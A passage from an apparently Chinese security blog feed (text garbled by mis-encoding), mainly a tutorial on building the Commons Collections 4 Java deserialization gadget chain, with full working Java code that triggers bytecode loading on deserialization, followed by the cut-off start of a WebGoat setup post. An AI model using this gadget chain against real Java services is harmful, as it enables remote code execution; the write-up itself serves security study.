    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å‰é¢å‡ æ¡é“¾éƒ½æ˜¯CommonsCollections3ä¸­äº§ç”Ÿçš„ååºåˆ—åŒ–æ¼æ´ï¼Œåæ¥Apacheæ›´æ–°äº†å¤§ç‰ˆæœ¬4.0ï¼Œä¹Ÿäº§ç”Ÿäº†ååºåˆ—åŒ–æ¼æ´ã€‚</p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><ul><li>JDK8u65</li><li>CommonsCollections4</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="CC4è°ƒç”¨é“¾åˆ†æ"><a href="#CC4è°ƒç”¨é“¾åˆ†æ" class="headerlink" title="CC4è°ƒç”¨é“¾åˆ†æ"></a>CC4è°ƒç”¨é“¾åˆ†æ</h2><p><img src="https://image.sp4rks.xyz/2024/06/CC4.png" alt="CC4"></p><p>åœ¨ä¹‹å‰çš„CCé“¾ä¸­ï¼Œæœ‰ä¸¤ç§æ‰§è¡Œä»£ç çš„æ–¹å¼<code>InvokerTransformer.transform()</code>å’Œ<code>InstantiateTransformer.transform()</code>åŠ¨æ€åŠ è½½å­—èŠ‚ç </p><p>å› ä¸ºCommonsCollections4å–æ¶ˆäº†InvokerTransformer çš„ Serializable ç»§æ‰¿ï¼Œæ‰€ä»¥åªèƒ½é€šè¿‡åŠ¨æ€åŠ è½½å­—èŠ‚ç çš„æ–¹å¼ååºåˆ—åŒ–ã€‚</p><p>æ‰€ä»¥æ¥ä¸‹æ¥å»æ‰¾è°è°ƒç”¨äº†<code>transform()</code> æ–¹æ³•</p><p>æ‰¾åˆ°äº†<code>org.apache.commons.collections4.comparators#TransformingComparator.compare()</code>ï¼Œå› ä¸º<code>this.transformer</code>å¯æ§</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240601123801402.png" alt="image-20240601123801402"></p><p>æ¥ç€æ‰¾è°è°ƒç”¨äº†<code>compare()</code>æ–¹æ³•ï¼Œæ‰¾åˆ°äº† <code>PriorityQueue.readObject().siftDownUsingComparator()</code></p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240601123947569.png" alt="image-20240601123947569"></p><p><code>PriorityQueue.readObject()</code>ä¸­æ–¹æ³•è°ƒç”¨</p><p><img src="https://image.sp4rks.xyz/2024/06/6.png" alt="6"></p><p>æ•´æ¡è°ƒç”¨é“¾æ¡ï¼Œå…¶å®ç›¸å½“äºå…¥å£ç±»å˜äº†ï¼Œæ–°åŠ äº†ä¸€ä¸ªç±»ï¼Œæ‰§è¡Œä»£ç çš„éƒ¨åˆ†å’ŒCC3æ˜¯ä¸€æ ·çš„</p><h2 id="CC4ç¼–å†™"><a href="#CC4ç¼–å†™" class="headerlink" title="CC4ç¼–å†™"></a>CC4ç¼–å†™</h2><p>æ‰§è¡Œä»£ç çš„åœ°æ–¹å’ŒCC3æ˜¯ä¸€æ ·çš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">//æ‰§è¡Œä»£ç çš„ç±»</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><br>        <span class="hljs-comment">//åŠ¨æ€åŠ è½½</span><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class), instantiateTransformer&#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>&lt;&gt;(transformers);<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±ç”¨<code>TransformingComparator</code>å»è°ƒç”¨<code>chainedTransformer</code>çš„<code>transformers()</code>æ–¹æ³•</p><p>TransformingComparatorçš„æ„é€ å‡½æ•°èƒ½ç›´æ¥ä¼ å…¥transformers</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240601125540711.png" alt="image-20240601125540711"></p><p>PriorityQueueçš„æ„é€ å‡½æ•°èƒ½ç›´æ¥ä¼ å…¥comparator</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240601125701669.png" alt="image-20240601125701669"></p><p>èµ°åˆ°è¿™é€»è¾‘å…¶å®å°±èµ°å®Œäº†ï¼Œå½“æˆ‘ä»¬è¿è¡Œä¸€ä¸‹ï¼Œå‘ç°å…¶å®å¹¶ä¸èƒ½æ­£å¸¸è¿è¡Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">//æ‰§è¡Œä»£ç çš„ç±»</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><br>        <span class="hljs-comment">//åŠ¨æ€åŠ è½½</span><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class), instantiateTransformer&#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>&lt;&gt;(transformers);<br><span class="hljs-comment">//        chainedTransformer.transform(1);</span><br><br><br>        <span class="hljs-comment">//è°ƒç”¨ ChainedTransformer.transform()</span><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer);<br>        <span class="hljs-comment">//PriorityQueueè°ƒç”¨TransformingComparator.compare()</span><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(transformingComparator);<br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="è°ƒè¯•ä»£ç "><a href="#è°ƒè¯•ä»£ç " class="headerlink" title="è°ƒè¯•ä»£ç "></a>è°ƒè¯•ä»£ç </h3><p>æ ¹æ®è¿™ä¸ªè°ƒç”¨é“¾å»è°ƒè¯•ä¸€ä¸‹</p><p><img src="https://image.sp4rks.xyz/2024/06/6.png" alt="6"></p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240601130436070.png" alt="image-20240601130436070"></p><p>è¿›å…¥<code>heapify()</code>æ–¹æ³•ä¸­æˆ‘ä»¬æƒ³è°ƒç”¨<code>siftDown()</code></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-type">void</span> <span class="hljs-title">heapify</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = (size &gt;&gt;&gt; <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) <span class="hljs-comment">//å‘ç°è¿™ä¸ªåˆ¤æ–­è¿‡ä¸å»</span><br>        <span class="hljs-built_in">siftDown</span>(i, (E) queue[i]);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://image.sp4rks.xyz/2024/06/image-20240601130808273.png" alt="image-20240601130808273"></p><p>sizeå¤§å°æœ€ä½ä¸º2çš„æ—¶å€™æ‰èƒ½è¿‡è¿™ä¸ªåˆ¤æ–­ï¼Œè¿›å…¥<code>siftDown()</code>ï¼ˆsizeè¡¨ç¤ºé˜Ÿåˆ—ä¸­å½“å‰å…ƒç´ çš„æ•°é‡ï¼‰</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240601130816243.png" alt="image-20240601130816243"></p><p>æ‰€ä»¥æˆ‘ä»¬çŸ¥é“äº†éœ€è¦è‡³å°‘ä¸¤ä¸ªå…ƒç´ ï¼Œå½“æˆ‘ä»¬æœ‰ä¸¤ä¸ªå…ƒç´ ä¹‹åï¼Œåºåˆ—åŒ–çš„æ—¶å€™æ‰§è¡Œäº†æ‰€æœ‰ä»£ç </p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240601131409516.png" alt="image-20240601131409516"></p><p>å› ä¸º<code>add()</code>æ–¹æ³•æœ€ç»ˆä¼šæ‰§è¡Œåˆ°<code>compare()</code>æ–¹æ³•ï¼Œå¯¼è‡´åºåˆ—åŒ–çš„æ—¶å€™å°±è¿è¡Œã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240601223552106.png" alt="image-20240601223552106"></p><p>é‚£è¿™å¹¶ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ï¼Œæˆ‘ä»¬æƒ³è¦ä»–ååºåˆ—åŒ–çš„æ—¶å€™æ‰§è¡Œã€‚  </p><p>ä¿®æ”¹æ–¹æ³•å¦‚ä¸‹:</p><h3 id="å®Œæ•´ä»£ç "><a href="#å®Œæ•´ä»£ç " class="headerlink" title="å®Œæ•´ä»£ç "></a>å®Œæ•´ä»£ç </h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">//æ‰§è¡Œä»£ç çš„ç±»</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><br>        <span class="hljs-comment">//åŠ¨æ€åŠ è½½</span><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class), instantiateTransformer&#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>&lt;&gt;(transformers);<br><span class="hljs-comment">//        chainedTransformer.transform(1);</span><br><br><br><br><br>    <span class="hljs-comment">//è°ƒç”¨ ChainedTransformer.transform()ã€‚(è¿™é‡Œæ”¾çš„æ˜¯ConstantTransformer&lt;&gt;()ï¼Œç›®çš„æ˜¯åºåˆ—åŒ–çš„æ—¶å€™ä¸è®©è¿™æ¡é“¾æ‰§è¡Œ)</span><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>&lt;&gt;(<span class="hljs-number">1</span>));<br>       <span class="hljs-comment">//PriorityQueueè°ƒç”¨TransformingComparator.compare()</span><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br><br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-comment">//åå°„ä¿®æ”¹transformingComparatorçš„å€¼ä¸ºtransformerï¼Œè®©å…¶ååºåˆ—åŒ–çš„æ—¶å€™è®©é“¾è¿æ¥èµ·æ¥</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">transformerField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>        transformerField.setAccessible(<span class="hljs-literal">true</span>);<br>        transformerField.set(transformingComparator, chainedTransformer);<br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="å‚è€ƒè¿æ¥"><a href="#å‚è€ƒè¿æ¥" class="headerlink" title="å‚è€ƒè¿æ¥"></a>å‚è€ƒè¿æ¥</h2><p><a href="https://www.bilibili.com/video/BV1NQ4y1q7EU/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Javaååºåˆ—åŒ–CommonsCollectionsç¯‡(å››)-æ‘†çƒ‚çš„å®Œç»“ç¯‡</a></p>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVAå®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æºç éƒ¨ç½²WebGoat</title>
    <link href="/2024/05/29/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E6%BA%90%E7%A0%81%E9%83%A8%E7%BD%B2Webgoat/"/>
    <url>/2024/05/29/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E6%BA%90%E7%A0%81%E9%83%A8%E7%BD%B2Webgoat/</url>
    
    <content type="html"><![CDATA[<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>WebGoaté¡¹ç›®åœ°å€: <a href="https://github.com/WebGoat/WebGoat">WebGoat</a></p><p>éœ€è¦JAVA17æˆ–è€…JAVA21ï¼Œå› ä¸ºSpring boot3æœ€ä½è¦æ±‚æ˜¯JAVA17.</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240529143754756.png" alt="image-20240529143754756"></p><h3 id="ä¸‹è½½é¡¹ç›®"><a href="#ä¸‹è½½é¡¹ç›®" class="headerlink" title="ä¸‹è½½é¡¹ç›®"></a>ä¸‹è½½é¡¹ç›®</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/WebGoat/WebGoat.git<br></code></pre></td></tr></table></figure><h3 id="ä½¿ç”¨IDEAæ„å»ºé¡¹ç›®"><a href="#ä½¿ç”¨IDEAæ„å»ºé¡¹ç›®" class="headerlink" title="ä½¿ç”¨IDEAæ„å»ºé¡¹ç›®"></a>ä½¿ç”¨IDEAæ„å»ºé¡¹ç›®</h3><p>IDEAè‡ªå¸¦mavenæ‰€ä»¥æˆ‘ä»¬ä¸éœ€è¦å•ç‹¬ä¸‹è½½</p><p>æ‰¾åˆ°<code>~/WebGoat/pom.xml</code>ç”¨ideaæ‰“å¼€ï¼Œé€‰æ‹©<code>open as peoject</code></p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240529162034060.png" alt="image-20240529162034060"></p><p>IDEAä¼šè‡ªåŠ¨ä¸‹è½½mavençš„ä¾èµ–ï¼Œæ—¶é—´æ¯”è¾ƒé•¿ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240529163502058.png" alt="image-20240529163502058"></p><p>ç­‰æ’ä»¶ä¸‹è½½å®Œæˆï¼Œæ‰¾åˆ°ç›®å½•ï¼š<code>src.main.java.org.owasp#webgoat.server.StartWebGoat</code>ç‚¹å‡»è¿è¡Œï¼Œè®¿é—® <a href="http://127.0.0.1:8080/WebGoat/">http://127.0.0.1:8080/WebGoat/</a> å’Œ <a href="http://127.0.0.1:9090/WebWolf/">http://127.0.0.1:9090/WebWolf/</a> å³å¯</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240529163537696.png" alt="image-20240529163537696"></p><h2 id="é‡åˆ°æŠ¥é”™"><a href="#é‡åˆ°æŠ¥é”™" class="headerlink" title="é‡åˆ°æŠ¥é”™"></a>é‡åˆ°æŠ¥é”™</h2><p>å¤§æ¦‚åŸå› 